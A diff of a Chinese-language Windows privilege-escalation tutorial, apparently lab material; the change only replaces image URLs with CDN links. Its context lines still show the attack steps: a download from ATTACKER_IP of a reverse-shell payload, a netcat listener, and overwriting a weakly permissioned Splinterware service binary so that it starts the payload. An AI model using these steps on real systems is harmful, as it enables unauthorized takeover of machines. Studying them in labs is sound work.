@@ -186,7 +186,7 @@ C:\> schtasks /run /tn vulntask
 
 你将在攻击机上，按预期收到具有 taskusr1 权限的反向 shell：
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/FLMBbILzdo2VMpxybyccHHmknId.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/FLMBbILzdo2VMpxybyccHHmknId.png)
 
 **AlwaysInstallElevated**
 
@@ -228,17 +228,17 @@ Windows 机器上的每个服务都有一个关联的可执行文件，只要服
 
 为了更好地理解服务的结构，让我们使用<span style="color: #FBBFBC">`sc qc`</span>命令检查 apphostsvc 服务配置：
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/Ue2kbjAZFoqIK8xWa2VcLCbPnSf.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/Ue2kbjAZFoqIK8xWa2VcLCbPnSf.png)
 
 在这里我们可以看到，关联的可执行文件是通过 <span style="color: #FBBFBC">`BINARY_PATH_NAME`</span> 参数指定的，用于运行服务的帐户会显示在 <span style="color: #FBBFBC">`SERVICE_START_NAME`</span> 参数上。
 
 计算机中的服务具有自由访问控制列表 (DACL-Discretionary Access Control List)，DACL将指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务，以及其他特权。DACL 可以手动查看也可以通过Process Hacker查看。以下是DACL示例：
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/SuyqbiMbqo3V3pxK3xKc34Lente.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/SuyqbiMbqo3V3pxK3xKc34Lente.png)
 
 所有服务配置都存储在注册表中<span style="color: #FBBFBC">`HKLM\SYSTEM\CurrentControlSet\Services\`</span>：
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/I7kibpT3UoF0Y0xB3HfcKroFnkb.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/I7kibpT3UoF0Y0xB3HfcKroFnkb.png)
 
 系统中的每个服务都有一个子项。 我们可以在 <span style="color: #FBBFBC">`ImagePath`</span> 值上看到服务所关联的可执行文件，在 <span style="color: #FBBFBC">`ObjectName`</span> 值上看到用于启动服务的帐户，如果为服务配置了 DACL（自由访问控制列表），它将存储在名为 <span style="color: #FBBFBC">`Security`</span> 的子项中。 默认情况下只有管理员才能修改此类注册表项。
 
@@ -248,11 +248,11 @@ Windows 机器上的每个服务都有一个关联的可执行文件，只要服
 
 要了解它是如何工作的，让我们看一下在 Splinterware System Scheduler（*splinterware*公司的一个应用软件）上发现的漏洞。 首先，我们将使用<span style="color: #FBBFBC">`sc qc`</span>查询相关服务配置：
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/KLAKb1JSIoFRoYxSPW4c2JERnXr.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/KLAKb1JSIoFRoYxSPW4c2JERnXr.png)
 
 由上述查询结果可知：漏洞软件所安装的服务以svcuser1账户运行，与该服务关联的可执行文件路径为<span style="color: #FBBFBC">`C:\Progra~2\System~1\WService.exe`</span>。 然后我们继续检查 服务关联的可执行文件的权限：
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/DBlxbRUwXoCQ1dxNvZfc0hB1ngb.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/DBlxbRUwXoCQ1dxNvZfc0hB1ngb.png)
 
 由上述结果可知，Everyone组 对服务所关联的可执行文件具有修改权限 (M)，这意味着我们可以简单地用我们偏好的任何有效负载（payload）覆盖此文件，然后此服务将使用配置的用户帐户的权限执行payload。
 
@@ -274,7 +274,7 @@ wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
 
 在 Windows 服务器中，我们将用payload文件替换掉服务所关联的可执行文件。 由于我们需要另一个用户来执行我们的payload文件，因此我们还要向Everyone组 授予完全权限：
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/TETibFOYPovP7Nx9wBocNUQRnUb.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/TETibFOYPovP7Nx9wBocNUQRnUb.png)
 
 在攻击者机上启动一个反向shell监听器：`user@attackerpc$ nc -lvp 4445`
 
@@ -292,7 +292,7 @@ C:\> sc start windowsscheduler
 
 在攻击机上，你将获得一个具有 svcusr1 权限的反向 shell界面：
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/SFsLbHJXqoOQ4OxsEanc9KJhnSg.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/SFsLbHJXqoOQ4OxsEanc9KJhnSg.png)
 
 
 
